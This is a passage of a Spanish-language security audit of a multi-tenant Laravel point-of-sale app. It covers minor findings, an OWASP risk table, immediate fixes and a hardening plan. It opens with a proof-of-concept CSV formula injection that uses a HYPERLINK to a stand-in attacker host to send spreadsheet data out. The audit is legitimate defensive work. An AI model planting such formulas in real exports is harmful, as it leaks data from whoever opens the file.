- **PoC:** un vendedor crea un cliente o producto llamado `=HYPERLINK("http://evil.tld/?d="&A1,"ver")` → el admin exporta y abre el archivo en Excel → exfiltración o phishing.
- **Recomendación:** `fn ($v) => preg_match('/^[=+\-@\t\r]/', $v) ? "'".$v : $v`.
- **Esfuerzo:** 30 min. **Prioridad:** **Baja**

#### VB-17 — Exposición de metadatos a invitados (Ziggy y `business`)
- **Archivos:** `HandleInertiaRequests.php:51` (`business` = modelo `BusinessSetting` completo, incluidos `nit`, `email`, `phone`, `ticket_config` y `module_config`, que se sirve también a invitados con la cookie `last_tenant`) y `:60` (`ziggy` con **todas** las rutas, incluidas las de `/admin/*` y la API, también para invitados).
- **Recomendación:** `->only(['name','logo_url','brand_color','brand_color_secondary'])` para invitados; `Ziggy` con `only`/`except` por grupo (`groups` en `config/ziggy.php`) para no publicar `admin.*` a usuarios que no sean super-admin.
- **Esfuerzo:** 1–2 h. **Prioridad:** **Baja**

#### VB-18 — Storefront API: rate-limit por hash del token (las keys inválidas no comparten contador) y CORS `*`
- **Archivos:** `AppServiceProvider.php:62-66`, `config/cors.php` (`allowed_origins => ['*']`, solo GET).
- **Problema:** cada bearer distinto tiene su propio contador, así que un flood con keys inventadas hace un `SELECT` por petición sin límite. No es explotable para adivinar keys (40 caracteres aleatorios, unos 238 bits), pero amplifica un DoS. CORS `*` con GET permite que la key se use desde el navegador; si el storefront la expone del lado cliente, una key con `can_manage_media` quedaría pública.
- **Recomendación:** limitador previo por IP solo para respuestas 401 (`Limit::perMinute(30)->by($request->ip())` cuando `findActiveByPlainKey` falla); restringir CORS al dominio del storefront y documentar que las keys con escritura **solo** se usan del lado servidor.
- **Esfuerzo:** 2 h. **Prioridad:** **Baja**

#### VB-19 — Suplantación: trazabilidad y sesión
- **Archivos:** `Admin/TenantController.php:266-307`, `ImpersonationController.php`.
- **Estado actual:** bien resuelta (pide contraseña, log, sin anidamiento, respeta `status` y tenant activo). Pendiente: (a) las acciones hechas durante la suplantación quedan registradas a nombre del usuario suplantado en `sale_audit_logs` y `stock_movements`; (b) la sesión suplantada no expira antes que una sesión normal (120 min, o más con "recordarme" previo).
- **Recomendación:** guardar `impersonator_id` en los logs de auditoría cuando exista en la sesión; caducidad de 30–60 min (`started_at` + middleware); notificar al admin del tenant (email o banner en su panel) cuando se suplante a un usuario suyo.
- **Esfuerzo:** 0,5 día. **Prioridad:** **Baja**

#### VB-20 — Otros puntos menores
- `SaleController::index:48` hace `leftJoin('clients'/'users')` sin filtro de tenant. Junto con VC-01, la búsqueda por nombre sirve de oráculo de existencia de clientes ajenos. Se corrige con VC-01.
- `UserController::userBranchRelationships` (`/users/relationships/definitive`) es un endpoint de depuración que sigue expuesto. Eliminarlo.
- `imagecreatefromstring()` en `BlobStorageService:94` y `PrintController` sin límite de dimensiones: una imagen de 2 MB puede declarar 20000×20000 píxeles → agota la memoria (DoS). Validar `dimensions:max_width=4000,max_height=4000`.
- Los logs registran el cuerpo de la respuesta de Blob (`BlobStorageService:45-48`) y la URL del logo. No hay secretos, pero conviene revisarlo.
- `qz/sign` es GET con el payload en la query string, que queda en los logs de acceso de Railway. Preferir POST.

---

### Riesgos Identificados

| # | Área OWASP (2021) | Puntuación (1-10) | Hallazgos | Comentario |
|---|---|:---:|---|---|
| A01 | **Control de acceso roto** (multi-tenant, IDOR, RBAC) | **9** | VC-01, VC-02, VC-03, VA-07, VM-11, VM-12 | El scope por tenant de Eloquent es sólido, pero las reglas `exists` sin tenant, los JOINs crudos y el RBAC aplicado solo en la UI rompen el aislamiento y la matriz de permisos. |
| A02 | Fallos criptográficos / secretos | **7** | VC-06, VM-10 | `APP_KEY` en `.env.example`; clave privada de QZ usable como oráculo de firma. Las API keys usan SHA-256 (correcto para tokens de alta entropía) y las contraseñas bcrypt de 12 rondas (bien). |
| A03 | Inyección (SQL, CSV, CRLF) | **3** | VB-16, VM-14 | No hay SQLi: todo `whereRaw`/`orderByRaw` usa bindings y `DATE_FORMAT` sale de un `match`. Hay inyección de fórmulas en CSV y CVEs de CRLF en dependencias. |
| A04 | Diseño inseguro (lógica de negocio) | **7** | VC-04, VB-18 | Precios, totales y fechas definidos por el cliente; permisos de POS no aplicados en el servidor. |
| A05 | Configuración insegura | **6** | VA-09, VM-13, VB-17 | TrustProxies `*`, sin cabeceras de seguridad, Ziggy completo para invitados, `SESSION_SECURE_COOKIE`/`SESSION_ENCRYPT` sin definir en el ejemplo. |
| A06 | Componentes vulnerables | **6** | VM-14 | Guzzle, PSR-7, Laravel, Dompdf, CommonMark, Vite y axios con avisos. |
| A07 | Autenticación y sesiones | **6** | VA-08, VA-09, VB-19 | Sesiones de usuarios desactivados siguen vivas; rate-limit de login evadible; sin 2FA para super-admin. Regeneración de sesión al iniciar y cerrar sesión: correcta. |
| A08 | Integridad de software y datos | **5** | VC-03, VC-01 (FK cruzadas) | Borrado de blobs ajenos; registros con FK de otro tenant. |
| A09 | Registro y monitoreo | **4** | VB-19 | Buen log de suplantación y de auditoría de ventas; falta atribuir acciones al suplantador y alertas de seguridad (bloqueos de login, 403 repetidos). |
| A10 | SSRF | **6** | VC-05 | `logo_url` sin filtro; filtro de `image_url` evadible con redirecciones, IPv6 o DNS. |
| — | XSS | **2** | — | No hay `dangerouslySetInnerHTML` ni `{!! !!}`; el PDF escapa con `e()`; los colores de marca se validan con regex; React escapa por defecto. |
| — | CSRF | **2** | — | El grupo `web` tiene `VerifyCsrfToken`/XSRF de Inertia; la API es stateless con bearer (sin cookies); `print/test-template` acepta GET pero no cambia estado. |
| — | Validación y asignación masiva | **5** | VC-01, VC-04 | `$fillable` correcto, `tenant_id` y `revoked_at` protegidos, sin `$request->all()`. El problema está en *qué* se valida (exists sin tenant, precios del cliente). |
| — | Subida de archivos | **3** | VB-20 | Regla `image` (sin SVG) + recodificación a WebP con GD (elimina payloads). Falta límite de dimensiones. |
| — | Protección de datos personales | **6** | VC-02, VM-15, VC-01 | PII de clientes accesible sin `clients.view`; fotos en el repo; fuga de emails entre tenants. |
| — | Storefront API (auth por key) | **4** | VC-05, VB-18 | Bien diseñada: key hasheada, scopes opt-in, tenant resuelto o 401/403, paginación acotada, LIKE escapado. Los riesgos están en el SSRF y en usar `image` como portada (VC-03). |

**Puntuación global de riesgo: 7/10.** Corregir VC-01 a VC-06 la bajaría a unos 3-4/10.

---

### Acciones Inmediatas

*(próximas 48–72 h, en este orden)*

1. **Verificar el `APP_KEY` de producción** frente a `.env.example` (VC-06). Si coincide, rotarlo con `APP_PREVIOUS_KEYS`. Vaciar `APP_KEY` en `.env.example`. *(1 h)*
2. **Acotar al tenant todas las reglas `exists:`** (VC-01) con un helper `tenantExists()`, y añadir `users.tenant_id`/`branches.tenant_id` a los JOINs de `ReportQueryService`. Ejecutar la consulta de auditoría de FK cruzadas en producción (solo lectura) para saber si ya hay datos contaminados. *(1 día)*
3. **Aplicar `can:` en rutas** de clientes, ventas, devoluciones, créditos, caja, POS, dashboard, `stock-movements.store` y exports de reportes (VC-02). Probar con los tres roles por defecto. *(1–2 días)*
4. **Restringir `BlobStorageService::delete()`** a host exacto + prefijo por tenant y eliminar `logo_url` libre (VC-03). *(0,5 día)*
5. **Exigir `users.assign_role`** y prohibir cambiarse el propio rol (VA-07). *(2 h)*
6. **Middleware `EnsureUserIsActive`** + borrar las sesiones al desactivar (VA-08). *(2 h)*
7. **Recalcular precios y totales en el servidor** y aplicar `pos.apply_discount`/`pos.sell_variable_price` (VC-04). *(1 día)*
8. **SSRF:** `allow_redirects => false`, allowlist de host de Blob, `CURLOPT_FOLLOWLOCATION=false` en `PrintController` y mensaje de error genérico (VC-05). *(0,5 día)*
9. **Actualizar `laravel/framework` y `guzzlehttp/*`** (VM-14). *(2 h + QA)*

---

### Plan de Hardening

**Fase 1 — Semana 1 (cierre de críticas)**
- Acciones inmediatas 1–9.
- Tests de regresión (Pest):
  - `TenantIsolationTest`: para cada endpoint con `{model}`, el usuario del tenant A pide el ID del tenant B y espera 404; para cada `POST`/`PUT` con FK, el ID del tenant B debe dar 422.
  - `PermissionEnforcementTest`: matriz rol × ruta (un usuario con rol vacío debe recibir 403 en todo salvo perfil y logout).
  - `PermissionCatalogCoverageTest`: todo permiso del catálogo tiene al menos un punto de enforcement en el backend o está en una allowlist "solo-UI" documentada.
  - Test de arquitectura: prohibir `exists:<tabla_con_tenant>` y `Rule::exists(` sin `tenant_id`; prohibir `DB::table(` en controladores sin `tenant_id`.

**Fase 2 — Semanas 2–3 (autenticación, configuración y superficie)**
- TrustProxies limitado a Railway o `REMOTE_ADDR`; limitadores de login por email y por IP global (VA-09).
- **2FA TOTP obligatorio para `super_admin`** (y opcional para administradores de tenant).
- Middleware `SecurityHeaders` (HSTS, XFO/frame-ancestors, nosniff, Referrer-Policy, CSP con nonce en modo report-only y luego enforce) (VM-13).
- `SESSION_SECURE_COOKIE=true`, `SESSION_ENCRYPT=true`, `SESSION_SAME_SITE=lax` (ya lo es), revisar `SESSION_LIFETIME` y la duración de "recordarme".
- Endurecer QZ Tray (VM-10): permiso + throttle + allowlist del contenido firmado, `POST` en vez de `GET`; planificar certificados por tenant.
- `IdentifyTenant`/`TenantScope` que fallen cerrados (VM-12); corregir los filtros de sucursal (VM-11).
- Ziggy filtrado por grupos y `business` reducido para invitados (VB-17).
- Eliminar `/users/relationships/definitive` y sacar `public/uploads` del repo (VM-15).

**Fase 3 — Mes 1–2 (procesos y monitoreo)**
- CI: `composer audit`, `npm audit --omit=dev`, `gitleaks`, Larastan nivel 6+ con regla personalizada para el scope de tenant.
- Dependabot o Renovate semanal.
- Atribuir `impersonator_id` en `sale_audit_logs`/`stock_movements`, caducidad de la suplantación y notificación al tenant (VB-19).
- Alertas: bloqueos de login (`Lockout`), picos de 403/404 por usuario (posible enumeración de IDs), creación de API keys, suplantaciones.
- Storefront API: rate-limit previo por IP para 401, CORS restringido al dominio del storefront, política documentada de "keys con escritura solo del lado servidor", rotación periódica de keys (VB-18).
- Datos personales: inventario de PII (clientes: documento, teléfono, email, fecha de nacimiento), política de retención, export y borrado a petición del titular (Ley 1581), y registro de accesos a los exports de clientes.
- Neutralizar fórmulas en CSV (VB-16) y limitar las dimensiones de las imágenes (VB-20).
- Pentest externo (caja gris, con dos tenants de prueba) cuando se cierren las fases 1 y 2.

---

#### Anexo — Controles verificados como correctos (no requieren acción)
- `tenant_id` fuera de `$fillable` en todos los modelos de tenant (solo está en `TenantApiKey`, `TenantImpersonation` y `StorefrontOrderCounter`, que se crean desde código de confianza).
- `IdentifyTenant` antes de `SubstituteBindings` (`bootstrap/app.php`), así que la vinculación de modelos por ruta queda acotada al tenant.
- `Role` sin scope, protegido con `authorizeSameTenant()` (`Settings/RoleController.php:146-149`) y en el admin (`TenantRoleController.php:145`); `TenantApiKeyController.php:58` verifica tenant y key.
- `UserController` sí comprueba `users.create/update/delete` y filtra `role_id` por tenant.
- Reglas `unique` de clientes y productos acotadas por tenant.
- `ResolveTenantFromApiKey`: falla cerrado, key en SHA-256, `revoked_at` no asignable masivamente, scopes `can_manage_media`/`can_generate_order_references` opt-in.
- Suplantación: contraseña del super-admin, log, sin anidamiento, respeta `status` y tenant activo, limpia `password_confirmed_at`.
- Login: `session()->regenerate()` al iniciar sesión e `invalidate()` + `regenerateToken()` al cerrarla; usuarios inactivos rechazados en el login.
- Subidas: regla `image` + recodificación WebP (elimina polyglots y scripts embebidos).
- Exportaciones PDF escapadas con `e()`; caché de reportes con clave por tenant.
- Sin SQLi: todos los `*Raw` usan bindings o valores de `match` cerrados.
